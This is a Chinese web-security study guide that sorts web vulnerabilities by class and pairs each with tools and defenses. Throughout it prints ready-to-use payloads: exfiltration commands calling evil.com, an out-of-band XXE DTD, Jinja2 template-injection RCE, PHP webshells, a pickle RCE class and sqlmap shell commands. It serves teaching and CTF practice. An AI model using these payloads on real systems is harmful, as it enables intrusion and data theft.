# Web 网络安全知识体系

> Web安全的本质：**用户输入不可信**。所有漏洞都源于程序对输入的信任——本该是数据的输入被当成了代码、命令、路径、查询。本文构建完整的Web安全知识体系，每个漏洞讲清原理、分类、攻击面和对应工具。

---

## 一、知识体系总架构

```
Web 安全知识体系
│
├── 注入类 ──────── 输入被当作代码/命令执行
│   ├── SQL注入
│   ├── 命令注入
│   ├── 代码注入
│   ├── XXE
│   ├── SSTI
│   ├── LDAP注入
│   └── XSS（HTML注入）
│
├── 认证与会话 ──── 身份验证机制被绕过
│   ├── 认证绕过
│   ├── 会话劫持
│   ├── CSRF
│   ├── JWT攻击
│   └── OAuth漏洞
│
├── 文件操作类 ──── 文件读写/执行越权
│   ├── 文件上传
│   ├── 文件包含
│   ├── 任意文件读取
│   └── 目录遍历
│
├── 逻辑类 ──────── 业务逻辑缺陷
│   ├── 越权访问（IDOR）
│   ├── 条件竞争
│   ├── 支付逻辑漏洞
│   └── 验证码绕过
│
├── 服务端类 ────── 服务端架构漏洞
│   ├── SSRF
│   ├── 反序列化
│   ├── 模板注入
│   └── 信息泄露
│
└── 客户端类 ────── 客户端安全
    ├── 点击劫持
    ├── CORS配置错误
    ├── CSP绕过
    └── PostMessage滥用
```

---

## 二、注入类漏洞

### 2.1 SQL 注入

**原理**：用户输入被拼入SQL语句，改变了SQL的语义结构。

**分类与攻击面**：

| 类型 | 触发条件 | 利用方式 |
|------|----------|----------|
| 联合注入 | 有回显位 | UNION SELECT读取数据 |
| 报错注入 | 有SQL错误回显 | extractvalue/updatexml报错带数据 |
| 布尔盲注 | 页面有正/异常差异 | 逐字符二分法猜解 |
| 时间盲注 | 无任何差异 | SLEEP/BENCHMARK延迟判断 |
| 堆叠注入 | 支持多语句执行 | 分号分隔执行任意SQL |
| 二次注入 | 输入存储后被二次使用 | 先存恶意数据，再触发 |

**攻击链**：

```
注入点发现 → 判断类型 → 确定列数和回显位 → 读取数据 → 提权/写Shell

数据获取路径：
  database() → information_schema.tables → information_schema.columns → 目标表数据

进阶攻击：
  读写文件：LOAD_FILE() / INTO OUTFILE
  UDF提权：自定义函数执行系统命令
  DNS外带：load_file(concat('\\\\',data,'.evil.com\\a'))
```

**工具**：SQLMap（自动化）、Burp Suite（手动测试）

### 2.2 命令注入

**原理**：用户输入被拼入操作系统命令，输入从参数变成了命令的一部分。

**注入方式**：

```
; command       顺序执行
| command       管道，只输出后者
|| command      前者失败才执行
&& command      前者成功才执行
$(command)      命令替换
`command`       命令替换
%0a command     换行执行
```

**无回显外带**：

```bash
curl http://evil.com/$(whoami)
nslookup $(cat /etc/passwd|base64).evil.com
```

**工具**：Burp Suite、commix（自动化命令注入）

### 2.3 代码注入

**原理**：用户输入被当作代码执行，比命令注入更灵活。

| 语言 | 危险函数 | 场景 |
|------|----------|------|
| PHP | eval/assert/preg_replace(/e)/create_function | 动态代码执行 |
| Python | exec/eval/compile | 动态代码执行 |
| Java | Runtime.exec/ProcessBuilder/ScriptEngine | 命令/脚本执行 |
| Node.js | eval/Function/vm模块 | JS代码执行 |

**工具**：Burp Suite、自定义脚本

### 2.4 XXE（XML外部实体注入）

**原理**：XML解析器处理用户控制的XML时，加载了外部实体引用。

```xml
<!-- 有回显XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

<!-- 无回显XXE（OOB） -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<!-- evil.dtd: <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://evil.com/?d=%file;'>"> %all; %send; -->
```

**攻击面**：读文件 / SSRF内网探测 / DoS(Billion Laughs) / Blind XXE外带

**工具**：Burp Suite、XXEinjector

### 2.5 SSTI（服务端模板注入）

**原理**：用户输入被模板引擎渲染执行，输入从数据变成了模板语法。

**识别**：

```
输入 {{7*7}} → 输出 49 → Jinja2/Twig
输入 ${7*7}  → 输出 49 → Freemarker/Velocity/EL
输入 <%=7*7%> → 输出 49 → ERB
输入 #{7*7}  → 输出 49 → Thymeleaf
输入 {{7*'7'}} → 输出 7777777 → Jinja2（字符串乘法）
```

**Jinja2 RCE**：

```python
# 基础
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# 通用payload链
{{''.__class__.__mro__[1].__subclasses__()}}
# 找到os._wrap_close类的索引，然后：
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('id').read()}}
```

**工具**：tplmap（自动化）、Burp Suite

### 2.6 XSS（跨站脚本）

**原理**：用户输入被原样输出到HTML页面，浏览器将其当作JS执行。

**三种类型**：

| 类型 | 触发 | 持久性 | 危害等级 |
|------|------|--------|----------|
| 反射型 | 点击恶意链接 | 一次性 | 中 |
| 存储型 | 输入被存库 | 永久 | 高 |
| DOM型 | JS操作DOM | 一次性 | 中 |

**攻击链**：XSS → 窃取Cookie → 会话劫持 → 以受害者身份操作

**绕过WAF**：

```html
<!-- 事件属性 -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- 编码绕过 -->
<script>alert&#40;1&#41;</script>
<script>\u0061lert(1)</script>

<!-- CSP绕过 -->
<link rel="dns-prefetch" href="//data.evil.com">  // DNS外带
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

**工具**：Burp Suite、XSStrike（自动化）、Browser DevTools

### 2.7 LDAP注入

**原理**：用户输入被拼入LDAP查询过滤器。

```
正常：(&(uid=user)(password=pass))
注入：uid=*)(|(uid=* → (&(uid=*)(|(uid=*)(password=pass))) → 绕过认证
```

**工具**：Burp Suite、ldap-injection-toolkit

---

## 三、认证与会话漏洞

### 3.1 认证绕过

```
常见绕过方式：

1. 弱口令
   admin/admin / admin/123456 / root/root
   工具：hydra / burp intruder / 字典爆破

2. 用户名枚举
   注册时提示"用户已存在" / 登录时提示"密码错误"vs"用户不存在"
   → 确认有效用户名后爆破密码

3. 默认凭证
   设备/框架/中间件的默认账号密码
   工具：DefaultCreds-Cheat-Sheet

4. 认证逻辑缺陷
   修改响应包绕过（抓包改302→200）
   修改用户ID绕过（user_id=1→user_id=2）
   JWT伪造（算法None / 弱密钥爆破）
```

### 3.2 会话劫持

```
攻击方式：

1. Cookie窃取
   XSS → document.cookie → 窃取会话Cookie

2. Session固定
   攻击者获取一个有效SessionID → 诱使受害者使用该ID → 共享会话

3. 会话预测
   SessionID生成算法可预测 → 伪造有效Session

4. CSRF
   伪造请求利用受害者的已有会话
```

### 3.3 JWT攻击

```
JWT结构：header.payload.signature

攻击方式：

1. 算法None
   修改header中alg为"none" → 删除签名 → 服务端可能接受
   构造：eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

2. 算法篡改 RS256→HS256
   服务端用RS256(非对称) → 攻击者改为HS256(对称)
   → 用公钥作为HS256密钥签名 → 服务端用公钥验证通过
   前提：获取公钥

3. 弱密钥爆破
   HS256密钥太弱 → 爆破
   工具：jwt-cracker / hashcat

4. Kid注入
   kid参数用于选择密钥 → 注入路径
   kid="../../../../dev/null" → 空密钥签名
   kid="1;command" → 命令注入
```

**工具**：jwt_tool、Burp Suite JSON Web Token插件

### 3.4 CSRF（跨站请求伪造）

**原理**：浏览器自动携带Cookie，攻击者构造恶意页面让用户访问，浏览器自动带上Cookie发请求。

```
攻击条件：
  1. 目标操作使用Cookie认证
  2. 请求参数可预测（无不可预测的Token）
  3. 无Referer/Origin验证

防御与绕过：
  CSRF Token → 窃取Token / Token可预测 / Token不绑定用户
  Referer验证 → 删Referer头 / 白名单不严
  SameSite Cookie → Lax模式GET请求仍带Cookie
```

**工具**：Burp Suite CSRF POC生成器

---

## 四、文件操作类漏洞

### 4.1 文件上传

**原理**：服务端未严格校验上传文件类型，攻击者上传可执行脚本。

**绕过体系**：

```
前端验证（JS检查）
  → Burp抓包改后缀绕过

后端验证——MIME类型检查（Content-Type）
  → Burp改Content-Type为image/jpeg

后端验证——文件头检查（Magic Bytes）
  → 图片马：GIF89a<?php eval($_POST['cmd']);?>

后端验证——后缀黑名单
  → 大小写：.PhP
  → 双写：.pphphp（过滤一次后变.php）
  → 替代后缀：.php5 .phtml .pht .phps
  → Windows：.php. .php(空格) .php::$DATA
  → .htaccess：AddType application/x-httpd-php .jpg
  → .user.ini：auto_prepend_file=shell.jpg

后端验证——后缀白名单
  → 图片马 + 文件包含执行
  → %00截断（PHP<5.3.4）

二次渲染（图片被重新处理）
  → 对比上传前后二进制，找到未修改区域注入代码

条件竞争（先保存后删除）
  → 并发上传+访问，在删除前执行
  → 木马写创建新文件的逻辑
```

**工具**：Burp Suite、AntSword（WebShell管理）、Weevely（生成加密WebShell）

### 4.2 文件包含

**原理**：服务端根据用户输入决定包含哪个文件，被包含的文件会被当作代码执行。

**利用路径**：

```
LFI（本地文件包含）：
  读文件：?page=../../../etc/passwd
  读源码：?page=php://filter/convert.base64-encode/resource=index.php
  执行代码：
    php://input + POST传PHP代码（需allow_url_include=On）
    data://text/plain,<?php system('id');?>
    日志包含：User-Agent注入代码 → 包含/var/log/apache2/access.log
    Session包含：登录表单注入代码 → 包含/tmp/sess_<PHPSESSID>
    /proc/self/environ包含：User-Agent注入 → 包含环境变量文件

RFI（远程文件包含）：
  ?page=http://evil.com/shell.txt（需allow_url_include=On）
```

**工具**：Burp Suite、hackbar、curl

### 4.3 任意文件读取/下载

**原理**：用户可控制读取文件的路径，未做目录限制。

```
利用：
  ?file=../../../etc/passwd
  ?path=....//....//....//etc/passwd    // 双写绕过../过滤
  ?file=/etc/passwd%00.jpg              // %00截断

常见目标文件：
  /etc/passwd /etc/shadow /etc/hosts
  /proc/self/cmdline /proc/self/environ
  /var/log/apache2/access.log
  Web应用配置文件（数据库密码）
  /flag（CTF）
```

**工具**：Burp Suite、curl

### 4.4 目录遍历

**原理**：使用`../`跳出限定目录访问其他文件。

```
绕过：
  ../ 过滤 → ..%252f（双重URL编码）
  ../ 过滤 → ....//（双写）
  ../ 过滤 → ..%c0%af（Unicode编码）
  绝对路径 → 不需要../，直接/etc/passwd
```

---

## 五、逻辑类漏洞

### 5.1 越权访问（IDOR）

**原理**：用户可以访问不属于自己权限的资源，服务端只验证了登录状态未验证所有权。

```
水平越权：同角色用户A访问用户B的数据
  修改user_id参数：?uid=1001 → ?uid=1002
  修改订单号：?order=2024001 → ?order=2024002

垂直越权：普通用户访问管理员功能
  普通用户直接访问/admin路由
  修改Cookie中的role字段
  修改请求头中的角色标识

发现方法：
  1. 两个不同权限账号抓包对比
  2. 找到ID/角色参数后替换测试
  3. 目录扫描发现管理后台
```

### 5.2 条件竞争

**原理**：多个请求并发执行，服务端未做原子性控制，导致非预期状态。

```
场景1：上传竞争
  服务端先保存文件再检查删除
  → 并发上传+并发访问 → 在删除前执行代码
  → 木马内写fputs(fopen('s.php','w'),'木马')创建持久后门

场景2：余额竞争
  同时发起多个转账请求 → 余额检查通过多次 → 余额变负
  → 同一笔钱转出多次

工具：
  Burp Intruder / Python多线程脚本
```

### 5.3 支付逻辑漏洞

```
常见类型：

1. 修改金额
   抓包修改price=0.01 / amount=-1

2. 修改数量
   quantity=0 / quantity=-1 / quantity=999999

3. 重复使用优惠券
   同一优惠券多次使用

4. 跳过支付步骤
   直接访问支付成功回调URL

5. 整数溢出
   购买超大数量 → 金额溢出为0或负数
```

### 5.4 验证码绕过

```
常见绕过：

1. 验证码复用
   不刷新验证码 → 同一验证码反复使用

2. 验证码在响应中返回
   响应包中包含验证码值

3. 验证码可预测
   纯数字4位 → 0000-9999爆破
   基于时间生成 → 可算出

4. 验证码校验不严格
   验证码为空时绕过
   验证码只验证前N位

5. 手机号/邮箱可替换
   获取自己手机验证码 → 请求中替换为目标手机号
```

---

## 六、服务端类漏洞

### 6.1 SSRF（服务端请求伪造）

**原理**：服务端根据用户输入发起请求，攻击者控制请求目标，让服务端访问内网资源。

**攻击面**：

```
协议利用：
  http://  → 内网Web服务探测
  file://  → 读取本地文件 file:///etc/passwd
  gopher:// → 构造任意TCP包（打Redis/MySQL/内网服务）
  dict://  → 探测服务 dict://127.0.0.1:6379/info

内网探测：
  http://127.0.0.1
  http://192.168.1.1
  http://10.0.0.1
  http://[::1]  // IPv6本地

打Redis（经典组合）：
  gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a...
  → 写WebShell / 写SSH密钥 / 写计划任务

绕过：
  IP限制 → 302跳转 / DNS Rebinding / 八进制/十六进制IP
  域名限制 → 短网址 / A记录指向127.0.0.1
  协议限制 → 302跳转到gopher://
```

**工具**：Burp Suite、SSRFmap、Gopherus

### 6.2 反序列化

**原理**：反序列化时自动触发魔术方法/回调函数，攻击者控制序列化数据控制执行流。

**PHP反序列化**：

```
核心：控制对象属性 + 触发魔术方法链

关键魔术方法：
  __destruct()   → 对象销毁时调用
  __wakeup()     → 反序列化时调用
  __toString()   → 对象被当字符串使用时调用
  __call()       → 调用不存在的方法时调用
  __get()        → 访问不存在的属性时调用

POP链构造：
  找入口（unserialize触发__wakeup/__destruct）
  → 找gadget（类方法中的危险操作）
  → 串联成链（一个方法的输出是下一个方法的触发条件）

Phar反序列化：
  phar://伪协议触发反序列化，不需要unserialize()
  文件操作函数(file_exists/is_file/fopen等) + phar:// → 自动反序列化
```

**Java反序列化**：

```
核心：利用Java反射机制 + 已知Gadget链执行任意代码

常见链：
  CommonsCollections → InvokerTransformer → Runtime.exec()
  Fastjson → JdbcRowSetImpl → JNDI注入
  Shiro → rememberMe反序列化 → CommonsBeanutils
  Weblogic → T3/IIOP协议 → 反序列化RCE
  Log4j2 → JNDI注入(${jndi:ldap://evil.com/a})

识别特征：
  请求中存在序列化数据（rO0AB开头 → Java序列化Base64）
  Content-Type: application/x-java-serialized-object
  Cookie中rememberMe=删除标记+Base64数据
```

**Python反序列化**：

```python
# pickle反序列化RCE
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())

# PyYAML反序列化
yaml.load("!!python/object/apply:os.system ['id']")  # 非safe_load
```

**工具**：ysoserial（Java）、PHPGGC（PHP）、Burp Suite

### 6.3 信息泄露

```
源码泄露：
  .git/ → git-dumper恢复
  .svn/ → svnbrowser
  .DS_Store → 解析目录结构
  www.zip / .bak / .swp → 直接下载
  .idea/workspace.xml → IDE配置

配置泄露：
  phpinfo.php → PHP配置
  web.config / application.yml → 数据库密码
  .env → 框架密钥/数据库凭证
  /api-docs / swagger-ui.html → API文档

报错泄露：
  触发错误 → 暴露物理路径/SQL语句/框架版本
  /debug / /trace → 调试信息

日志泄露：
  /var/log/ → 访问日志/错误日志
  ELK未授权 → Kibana/Elasticsearch数据
```

**工具**：dirsearch、curl、git-dumper、ds_store_exp

---

## 七、客户端类漏洞

### 7.1 点击劫持

```
原理：透明iframe覆盖在合法按钮上，用户以为点击合法按钮实际点击了恶意页面

防御：X-Frame-Options: DENY/SAMEORIGIN
绕过：无X-Frame-Options头时可直接利用
```

### 7.2 CORS配置错误

```
原理：服务端Access-Control-Allow-Origin配置不当，允许恶意域读取响应

危险配置：
  Access-Control-Allow-Origin: *              → 任意域可读（带凭证时不行）
  Access-Control-Allow-Origin: https://evil.com  → 反射请求Origin
  Access-Control-Allow-Credentials: true      → 允许带Cookie

利用：恶意页面fetch目标API → 浏览器允许读取响应 → 窃取数据
```

### 7.3 CSP绕过

```
CSP（Content-Security-Policy）限制页面可加载的资源来源

常见绕过：
  unsafe-eval → eval('alert(1)')
  unsafe-inline → 直接<script>alert(1)</script>
  允许外部域 → <script src="https://allowed.com/evil.js">
  允许base-uri → <base href="https://evil.com/">劫持相对路径
  JSONP端点 → <script src="https://allowed.com/api?callback=alert(1)//">
```

---

## 八、必备工具体系

### 8.1 工具全景图

```
                    ┌─────────────────────────────┐
                    │      Web安全必备工具          │
                    └──────────────┬──────────────┘
                                   │
          ┌────────────┬───────────┼───────────┬────────────┐
          │            │           │           │            │
      抓包改包     扫描探测     注入利用    编解码      专项利用
          │            │           │           │            │
      Burp Suite   dirsearch   SQLMap     CyberChef   AntSword
          │         gobuster     commix    hackbar     Weevely
      浏览器DevTools whatweb    XXEinjector DevTools   jwt_tool
          │         Wappalyzer  tplmap                 ysoserial
       curl         nmap                              PHPGGC
                                                     Gopherus
```

### 8.2 核心工具详解

#### Burp Suite

```
定位：Web安全的核心工具，90%的测试都通过它完成

必须掌握的模块：
  Proxy     → 抓包改包，所有测试的入口
  Repeater  → 手动重放测试，验证每个漏洞
  Intruder  → 自动化爆破（目录/密码/参数）
  Decoder   → 编解码转换
  Comparer  → 对比差异（盲注判断）

关键操作：
  Ctrl+R    → 发送到Repeater
  Ctrl+I    → 发送到Intruder
  Ctrl+U    → URL编码选中内容
  Ctrl+Shift+U → URL解码
  代理设置   → 127.0.0.1:8080
  证书安装   → http://burp下载CA证书导入浏览器

进阶技巧：
  Match and Replace → 自动替换请求中的值
  Upstream Proxy    → 多级代理
  Logger           → 记录所有请求
  插件扩展          → Bypass WAF / HackBar / JWT Editor
```

#### SQLMap

```
定位：SQL注入自动化利用，最成熟的注入工具

核心命令：
  # 检测与利用
  sqlmap -u URL --dbs --batch
  sqlmap -u URL -D 库 -T 表 --dump

  # POST注入
  sqlmap -u URL --data="id=1" --dbs

  # 指定参数和级别
  sqlmap -u URL -p id --level=5 --risk=3

  # 绕WAF
  sqlmap -u URL --tamper=space2comment,between,randomcase

  # 读写文件
  sqlmap -u URL --file-read="/etc/passwd"
  sqlmap -u URL --file-write="shell.php" --file-dest="/var/www/html/s.php"

  # 获取Shell
  sqlmap -u URL --os-shell
  sqlmap -u URL --sql-shell
```

#### dirsearch / gobuster

```bash
# dirsearch（推荐，开箱即用）
dirsearch -u http://target.com -e php,html,bak,zip,git
dirsearch -u http://target.com -w wordlist.txt -t 50

# gobuster（更快，适合大字典）
gobuster dir -u http://target.com -w common.txt -x php,bak
gobuster dns -d target.com -w subdomains.txt   # 子域名爆破
```

#### AntSword

```
定位：WebShell管理，上传木马后的操作平台

使用流程：
  1. 上传一句话木马到目标服务器
  2. AntSword添加URL和连接密码
  3. 文件管理 → 找flag
  4. 虚拟终端 → 执行命令

编码注意：
  Linux → UTF-8
  Windows → GBK
  编码错误会导致乱码和命令执行失败
```

#### CyberChef

```
定位：编解码瑞士军刀，在线使用

地址：https://gchq.github.io/Cyberoshef/

常用操作：
  Magic → 自动识别编码
  From/To Base64
  From/To Hex
  URL Encode/Decode
  AES/DES Decrypt
  MD5/SHA Hash
  XOR

技巧：多个操作可串联，形成处理流水线
```

### 8.3 按漏洞选工具速查

| 漏洞 | 首选工具 | 辅助工具 | 关键操作 |
|------|----------|----------|----------|
| SQL注入 | SQLMap | Burp Suite | `--dbs --tamper` |
| XSS | Burp Suite | Browser DevTools | Repeater测试 |
| CSRF | Burp Suite | 浏览器 | 生成POC |
| 文件上传 | Burp Suite | AntSword | 改包绕过+连接Shell |
| 文件包含 | hackbar/curl | Burp Suite | 伪协议构造 |
| 命令注入 | Burp Suite | commix | 拼接符测试 |
| XXE | Burp Suite | XXEinjector | 构造XML实体 |
| SSTI | hackbar/curl | tplmap | 框架识别+payload |
| SSRF | Burp Suite | Gopherus | 协议构造 |
| 反序列化 | Python脚本 | ysoserial/PHPGGC | 构造链 |
| JWT攻击 | jwt_tool | Burp Suite | 算法篡改 |
| 信息泄露 | curl/dirsearch | git-dumper | 敏感路径扫描 |
| 目录扫描 | dirsearch | gobuster | 字典+扩展名 |

---

## 九、漏洞防御对应表

**了解防御才能理解绕过——每个漏洞的防御和对应绕过。**

| 漏洞 | 防御方式 | 绕过方法 |
|------|----------|----------|
| SQL注入 | 预编译语句 | 无法绕过（正确使用时） |
| SQL注入 | 转义函数 | 宽字节/数字型注入/GBK编码 |
| SQL注入 | WAF | tamper脚本/编码/分块传输 |
| XSS | 输出编码 | 未编码的上下文/事件属性/CSP绕过 |
| XSS | CSP策略 | unsafe-eval/JSONP/base-uri绕过 |
| CSRF | CSRF Token | Token泄露/可预测/不绑定用户 |
| 文件上传 | 后缀白名单 | 图片马+文件包含 |
| 文件上传 | Content-Type检查 | Burp改包 |
| 文件上传 | 文件头检查 | 图片马(GIF89a) |
| 命令注入 | 黑名单过滤 | 编码绕过/替代命令/管道符变体 |
| SSRF | IP黑名单 | 302跳转/DNS Rebinding/八进制IP |
| 反序列化 | 签名验证 | 密钥泄露/算法篡改/签名绕过 |

---

> Web安全的完整知识体系就是：**所有漏洞的本质都是输入越界，所有防御的本质都是边界校验，所有绕过的本质都是等价替换。** 掌握这个三角关系，遇到新漏洞也能快速理解——无非是新的输入点、新的校验方式、新的等价语法。
